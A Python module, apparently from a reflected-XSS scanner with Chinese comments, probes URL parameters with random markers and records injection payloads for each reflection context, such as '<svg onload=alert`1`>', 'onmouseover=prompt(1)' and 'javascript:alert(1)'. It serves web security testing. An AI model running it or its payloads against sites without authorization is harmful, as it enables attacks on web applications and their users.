import sys
import copy
import requests
import threading
from urllib.parse import urlparse
from core.jsparser import searchInputInScript
from core.htmlparser import searchInputInResponse
from core.config import xsschecker, XSS_EVAL_ATTITUDES
from core.utils import getUrl, getParams, getHeader, get_random_str, random_upper, get_complete_url, add_extra_params, request_info

'''
基本流程:
1.针对target 获得host,url和params字典
2.替换params字典中的参数值进行潜在注入点的检测
3.针对潜在注入点信息进行html,js解析并发送不同的测试payload进行测试
4.对测试payload响应内容判断是否存在xss漏洞

未完成:
发现页面隐藏参数 进行参数合并
js解析源码阅读

返回的结果字典:
url:
position:query
paramKey:
payload:
Request:
Response:
msg(什么类型的XSS)
'''


class Scan(threading.Thread):
    def __init__(self, q, result):
        super().__init__()
        self.q = q
        self.result = result

    def run(self) -> None:
        while not self.q.empty():
            url = self.q.get()
            self.scan(target=url)

    def scan(self, target):
        sys.stdout.write('\033[0;32;40m正在对{}进行扫描 \033[0m\n'.format(target))
        # print('正在对' + target + '进行扫描')
        host = urlparse(target).netloc
        url = getUrl(target)
        params = getParams(target)
        params = add_extra_params(copy.deepcopy(params))
        if params is None:
            print('没有检测到参数')
            return
        # 每个参数的检验流程 1.潜在注入测试 2.回显payload测试
        for paramsName in params.keys():
            paramsCopy = copy.deepcopy(params)
            paramsCopy[paramsName] = xsschecker
            # 1.潜在注入测试
            res = requests.get(url=url, params=paramsCopy, headers=getHeader())
            if xsschecker not in res.text:
                return

            # 2.根据回显位置构造 payload测试
            occurences = searchInputInResponse(html_doc=res.text, xsscheck=xsschecker)
            print("\033[0;31;40m{url}参数{param}发现潜在注入点 \033[0m".format(url=url,param=paramsName))
            if len(occurences) == 0:
                # 如果没有检测到反射点
                flag = get_random_str(5)
                payload = '<{}//'.format(flag)
                paramsCopy[paramsName] = payload
                _res = requests.get(url=url, params=paramsCopy, headers=getHeader())
                if payload in _res.text:
                    print(url + paramsName + 'html代码未被转义')

            # 3.传入请求的url和参数字典 回显位置的信息 进行进一步的payload测试
            # print('**********存在潜在注入点注入点 开始进入payload测试************')
            for occurence in occurences:
                _type = occurence['type']
                if _type == 'html':
                    self.html_check(occurence, url, paramsCopy, paramsName)
                elif _type == 'attribute':
                    self.attribute_check(occurence, url, paramsCopy, paramsName)
                elif _type == 'comment':
                    self.comment_check(occurence, url, paramsCopy, paramsName)
                elif _type == 'script':
                    self.script_check(occurence, url, paramsCopy, paramsName)

            sys.stdout.write('{}扫描完成\n'.format(url))

    def html_check(self, occurence, url, params, paramName):
        _type = occurence['type']
        details = occurence['details']
        # 如果在标签名是style 采用形如expression(a(odfqkv))payload  --> IE6及以下的浏览器
        if details['tagname'] == 'style':
            payload = "expression(a({}))".format(get_random_str(6))
            true_payload = 'expression(alert(1))'
            params[paramName] = payload
            res = requests.get(url=url, params=params, headers=getHeader())
            _locations = searchInputInResponse(html_doc=res.text, xsscheck=payload)
            for location in _locations:
                if payload in location['details']['content'] and location['details']['tagname'] == 'style':
                    tmp_res = {
                        'host': get_complete_url(url, params),
                        'ParamPosition': 'query',
                        'ParamKey': paramName,
                        'Payload': true_payload,
                        'Request': request_info(url, res.request.method, res.request.headers, res.request.body),
                        'Response': '',
                        'msg': 'IE下可执行的表达式 expression(alert(1))'
                    }
                    self.result.append(tmp_res)
        # 如果被非style标签包裹 试探payload:</被包裹标签名><随机七位字符>  真实payload</被包裹标签名><随机七位字符>
        else:
            flag = get_random_str(7)
            # 如果文本未被标签包裹(tagname==html) 仅仅为html文本中的内容则payload不需要</{tagname}>去闭合上一个标签
            if details['tagname'] == 'html':
                payload = "<{}>".format(flag)
                true_payload = "{}".format("<svg onload=alert`1`>")
            else:
                payload = "</{}><{}>".format(random_upper(details["tagname"]), flag)
                true_payload = "</{}>{}".format(random_upper(details["tagname"]), "<svg onload=alert`1`>")
            params[paramName] = payload
            # print('测试payload是' + payload)
            res = requests.get(url=url, params=params, headers=getHeader())
            _locations = searchInputInResponse(html_doc=res.text, xsscheck=flag)
            for location in _locations:
                if location['details']['tagname'] == flag:
                    # print('发现了flag标签详细信息为' + str(location['details']) + '\nxss类型:可在html中构造新标签')
                    tmp_res = {
                        'host': get_complete_url(url, params),
                        'ParamPosition': 'query',
                        'ParamKey': paramName,
                        'Payload': true_payload,
                        'Request': request_info(url, res.request.method, res.request.headers, res.request.body),
                        'Response': '',
                        'msg': 'html文本中可构造新标签'
                    }
                    self.result.append(tmp_res)

    def attribute_check(self, occurence, url, params, paramName):
        _type = occurence['type']
        details = occurence['details']
        # 如果潜在注入点在属性名的位置
        if details['content'] == 'key':
            # print('进入属性名回显测试')
            # 1.测试payload:><flag 通过是否产生flag标签来判断能否正确闭合原标签
            flag = get_random_str(7)
            payload = '><{}'.format(flag)
            print('回显位置在属性名中 测试payload是' + payload)
            true_payload = "><svg onload=alert`1`>"
            params[paramName] = payload
            res = requests.get(url=url, params=params, headers=getHeader())
            _locations = searchInputInResponse(html_doc=res.text, xsscheck=flag)
            print('测试payload回显信息为:' + str(_locations))
            for location in _locations:
                if flag in location['details']['tagname']:
                    # 此处tagname不能等于== 会漏报形为><flag=xxx(原网页设定的属性值)> --> 解析为tagname == 'flag=xxx'
                    print('回显位置在属性名中:发现了flag标签 详细信息为' + str(location['details']) + '\nxss类型:可在属性值中构造新标签')
                    tmp_res = {
                        'host': get_complete_url(url, params),
                        'ParamPosition': 'query',
                        'ParamKey': paramName,
                        'Payload': true_payload,
                        'Request': request_info(url, res.request.method, res.request.headers, res.request.body),
                        'Response': '',
                        'msg': '属性名可以闭合原标签,构造新标签'
                    }
                    self.result.append(tmp_res)
                    return

            # 2.测试payload:flag= 通过能否产生flag属性判断能否构造响应事件
            flag = get_random_str(5)
            payload = flag + '='
            true_payload = 'onmouseover=prompt(1)'
            params[paramName] = payload
            res = requests.get(url=url, params=params, headers=getHeader())
            _locations = searchInputInResponse(html_doc=res.text, xsscheck=flag)
            for location in _locations:
                for _k, _v in location['details']['attributes']:
                    if _k == flag:
                        print('回显位置在属性名中:发现了flag属性值 详细信息为' + str(location['details']) + '\nxss类型:标签中可以构造新属性')
                        tmp_res = {
                            'host': get_complete_url(url, params),
                            'ParamPosition': 'query',
                            'ParamKey': paramName,
                            'Payload': true_payload,
                            'Request': request_info(url, res.request.method, res.request.headers, res.request.body),
                            'Response': '',
                            'msg': '标签中可以构造新属性'
                        }
                        self.result.append(tmp_res)

        # 如果潜在注入点在属性值的位置
        else:
            # 1.测试payload:('|"| )flag=('|"| ) 通过能否产生flag属性 判断能否构造事件
            flag = get_random_str(5)
            for _payload in ["\'", "\"", " ", "\"\"", "\'\'"]:
                payload = _payload + ' ' + flag + '=' + _payload
                print('标签中构造新属性测试payload' + payload)
                true_payload = "{payload} onmouseover=prompt(1){payload}".format(payload=_payload)
                params[paramName] = payload
                res = requests.get(url=url, params=params, headers=getHeader())
                _locations = searchInputInResponse(html_doc=res.text, xsscheck=flag)
                print("测试payload回显信息" + str(_locations))
                for location in _locations:
                    for _k, _v in location['details']['attributes']:
                        if _k == flag:
                            tmp_res = {
                                'host': get_complete_url(url, params),
                                'ParamPosition': 'query',
                                'ParamKey': paramName,
                                'Payload': true_payload,
                                'Request': request_info(url, res.request.method, res.request.headers, res.request.body),
                                'Response': '',
                                'msg': '标签中可构造新属性'
                            }
                            self.result.append(tmp_res)
                            return

            # 2.测试payload:('|"| )><flag> 通过是否产生flag标签 判断能否正确闭合原标签
            flag = get_random_str(7)
            for _payload in [r"'><{}>", "\"><{}>", "><{}>"]:
                payload = _payload.format(flag)
                true_payload = _payload.format("svg onload=alert`1`")
                params[paramName] = payload
                res = requests.get(url=url, params=params, headers=getHeader())
                _locations = searchInputInResponse(html_doc=res.text, xsscheck=flag)
                for location in _locations:
                    if location['details']['tagname'] == flag:
                        tmp_res = {
                            'host': get_complete_url(url, params),
                            'ParamPosition': 'query',
                            'ParamKey': paramName,
                            'Payload': true_payload,
                            'Request': request_info(url, res.request.method, res.request.headers, res.request.body),
                            'Response': '',
                            'msg': '属性值可以闭合原标签,构造新标签'
                        }
                        self.result.append(tmp_res)
                        return

            # 3.针对特殊属性名进行处理  出现在特殊属性的属性值中不需要构造新标签或者新属性也可能产生漏洞
            specialAttributes = ['srcdoc', 'src', 'action', 'data', 'href']  # 特殊处理属性
            keyname = details["attributes"][0][0]
            tagname = details["tagname"]
            if keyname in specialAttributes:
                flag = get_random_str(7)
                params[paramName] = flag
                res = requests.get(url=url, params=params, headers=getHeader())
                _locations = searchInputInResponse(html_doc=res.text, xsscheck=flag)
                # 如果flag出现在当前标签的属性值且属性名为特殊属性(特殊属性一般在第一个属性)的话 则可能存在XSS
                for location in _locations:
                    if len(location['details']['attributes']) > 0 and location['details']['attributes'][0][
                        0] == keyname and \
                            location['details']['attributes'][0][1] == flag:
                        true_payload = flag
                        if location['details']['attributes'][0][0] in specialAttributes:
                            true_payload = "javascript:alert(1)"
                        tmp_res = {
                            'host': get_complete_url(url, params),
                            'ParamPosition': 'query',
                            'ParamKey': paramName,
                            'Payload': true_payload,
                            'Request': request_info(url, res.request.method, res.request.headers, res.request.body),
                            'Response': '',
                            'msg': '特殊属性{}的属性值可控'.format(keyname)
                        }
                        self.result.append(tmp_res)
                        return
            # 4.针对style标签进行处理
            elif keyname == 'style':
                true_payload = "expression(a({}))".format(get_random_str(6))
                params[paramName] = true_payload
                res = requests.get(url=url, params=params, headers=getHeader())
                _locations = searchInputInResponse(html_doc=res.text, xsscheck=true_payload)
                for location in _locations:
                    if true_payload in str(location['details']) and len(location['details']['attributes']) > 0 and \
                            location['details']['attributes'][0][0] == keyname:
                        tmp_res = {
                            'host': get_complete_url(url, params),
                            'ParamPosition': 'query',
                            'ParamKey': paramName,
                            'Payload': true_payload,
                            'Request': request_info(url, res.request.method, res.request.headers, res.request.body),
                            'Response': '',
                            'msg': '特殊属性{}的属性值可控'.format(keyname)
                        }
                        self.result.append(tmp_res)
                        return
            # 5.当flag作为属性值且属性名为响应事件的情况下
            elif keyname.lower() in XSS_EVAL_ATTITUDES:
                payload = get_random_str(6)
                true_payload = 'alert(1)'
                params[paramName] = payload
                res = requests.get(url=url, params=params, headers=getHeader())
                _locations = searchInputInResponse(html_doc=res.text, xsscheck=payload)
                for location in _locations:
                    print('测试payload回显信息' + str(location))
                    _attribute = location['details']['attributes']
                    if len(_attribute) > 0 and _attribute[0][0].lower() == keyname.lower() and _attribute[0][
                        1] == payload:
                        tmp_res = {
                            'host': get_complete_url(url, params),
                            'ParamPosition': 'query',
                            'ParamKey': paramName,
                            'Payload': true_payload,
                            'Request': request_info(url, res.request.method, res.request.headers, res.request.body),
                            'Response': '',
                            'msg': '响应事件{}的属性值可控'.format(keyname)
                        }
                        self.result.append(tmp_res)

    def comment_check(self, occurence, url, params, paramName):
        _type = occurence['type']
        details = occurence['details']
        flag = get_random_str(7)
        for _payload in ['-->', '!-->']:
            payload = '{}<{}>'.format(_payload, flag)
            true_payload = payload.format(_payload, "svg onload=alert`1`")
            params[paramName] = payload
            res = requests.get(url=url, params=params, headers=getHeader())
            _locations = searchInputInResponse(html_doc=res.text, xsscheck=flag)
            for location in _locations:
                if flag in location['details']['tagname']:
                    tmp_res = {
                        'host': get_complete_url(url, params),
                        'ParamPosition': 'query',
                        'ParamKey': paramName,
                        'Payload': true_payload,
                        'Request': request_info(url, res.request.method, res.request.headers, res.request.body),
                        'Response': '',
                        'msg': 'html注释标签可被闭合'
                    }
                    self.result.append(tmp_res)

    def script_check(self, occurence, url, params, paramName):
        # html标签检测
        _type = occurence['type']
        details = occurence['details']
        flag = get_random_str(7)
        script_tag = random_upper(details['tagname'])
        payload = "</{}><{}><{}></{}>".format(script_tag, script_tag, flag, script_tag)
        params[paramName] = payload
        res = requests.get(url=url, params=params, headers=getHeader())
        _locations = searchInputInResponse(html_doc=res.text, xsscheck=flag)
        for location in _locations:
            if location['details']['tagname'] == flag:
                tmp_res = {
                    'host': get_complete_url(url, params),
                    'ParamPosition': 'query',
                    'ParamKey': paramName,
                    'Payload': payload,
                    'Request': request_info(url, res.request.method, res.request.headers, res.request.body),
                    'Response': '',
                    'msg': 'script标签可被闭合'
                }
                self.result.append(tmp_res)
                return
        # js语法树检测
        source = details['content']
        _occurences = searchInputInScript(input=xsschecker, script=source)
        for occurence in _occurences:
            _type = occurence['type']
            _details = occurence['details']
            if _type == 'InlineComment':
                flag = get_random_str(5)
                payload = "\n;{};//".format(flag)
                truepayload = "\n;{};//".format('prompt(1)')
                params[paramName] = payload
                res = requests.get(url=url, params=params, headers=getHeader())
                _request_info = request_info(url, res.request.method, res.request.headers, res.request.body)
                for _item in searchInputInResponse(html_doc=res.text, xsscheck=flag):
                    if _item['details']['tagname'] != 'script':
                        continue
                    resp2 = _item['details']['content']
                    output = searchInputInScript(input=flag, script=resp2)
                    for o in output:
                        if flag in o['details']['content'] and o['type'] == "ScriptIdentifier":
                            tmp_res = {
                                'host': get_complete_url(url, params),
                                'ParamPosition': 'query',
                                'ParamKey': paramName,
                                'Payload': truepayload,
                                'Request': _request_info,
                                'Response': '',
                                'msg': 'js单行注释可被bypass'
                            }
                            self.result.append(tmp_res)
                            return

            elif _type == "BlockComment":
                flag = "0x" + get_random_str(4, "abcdef123456")
                payload = "*/{};/*".format(flag)
                truepayload = "*/{};/*".format('prompt(1)')
                params[paramName] = payload
                res = requests.get(url=url, params=params, headers=getHeader())
                _request_info = request_info(url, res.request.method, res.request.headers, res.request.body)
                for _item in searchInputInResponse(html_doc=res.text, xsscheck=flag):
                    if _item['details']['tagname'] != 'script':
                        continue
                    resp2 = _item['details']['content']
                    output = searchInputInScript(input=flag, script=resp2)
                    for o in output:
                        if flag in o['details']['content'] and o['type'] == "ScriptIdentifier":
                            tmp_res = {
                                'host': get_complete_url(url, params),
                                'ParamPosition': 'query',
                                'ParamKey': paramName,
                                'Payload': truepayload,
                                'Request': _request_info,
                                'Response': '',
                                'msg': 'js块注释可被bypass'
                            }
                            self.result.append(tmp_res)
                            return

            elif _type == "ScriptIdentifier":
                res = requests.get(url=url, params=params, headers=getHeader())
                _request_info = request_info(url, res.request.method, res.request.headers, res.request.body)
                tmp_res = {
                    'host': get_complete_url(url, params),
                    'ParamPosition': 'query',
                    'ParamKey': paramName,
                    'Payload': 'alert(1)',
                    'Request': _request_info,
                    'Response': '',
                    'msg': '可直接执行任意js命令'
                }
                self.result.append(tmp_res)

            elif _type == "ScriptLiteral":
                content = _details["content"]
                quote = content[0]
                flag = get_random_str(6)
                if quote == "'" or quote == "\"":
                    payload = '{quote}-{rand}-{quote}'.format(quote=quote, rand=flag)
                    truepayload = '{quote}-{rand}-{quote}'.format(quote=quote, rand="prompt(1)")
                else:
                    flag = "0x" + get_random_str(4, "abcdef123456")
                    payload = flag
                    truepayload = "prompt(1)"
                params[paramName] = payload
                res = requests.get(url=url, params=params, headers=getHeader())
                _resqust_info = request_info(url, res.request.method, res.request.headers, res.request.body)
                resp2 = None
                for _item in searchInputInResponse(html_doc=res.text, xsscheck=payload):
                    if payload in _item["details"]["content"] and _item["type"] == "script":
                        resp2 = _item["details"]["content"]

                    if not resp2:
                        continue
                    output = searchInputInScript(input=flag, script=resp2)

                    if output:
                        for _output in output:
                            if flag in _output["details"]["content"] and _output["type"] == "ScriptIdentifier":
                                tmp_res = {
                                    'host': get_complete_url(url, params),
                                    'ParamPosition': 'query',
                                    'ParamKey': paramName,
                                    'Payload': truepayload,
                                    'Request': _resqust_info,
                                    'Response': '',
                                    'msg': 'script脚本内容可被任意设置'
                                }
                                self.result.append(tmp_res)



